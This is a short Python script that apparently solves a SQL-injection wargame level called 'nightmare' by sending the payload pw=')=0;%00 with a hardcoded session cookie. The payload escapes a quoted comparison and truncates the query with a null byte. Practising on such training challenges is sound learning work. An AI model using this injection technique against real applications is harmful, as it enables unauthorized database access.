import requests

url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php?"
cookie = {'PHPSESSID':'niq1sjuo2o30eavfbhd3aneup4'}

def solve():
    query = "pw=%27)=0;%00"
    res = requests.get(url=url+query, cookies=cookie)
    if "NIGHTMARE Clear!" in res.text:
        print("NIGHTMARE Clear!")

if __name__ == "__main__":
    solve()
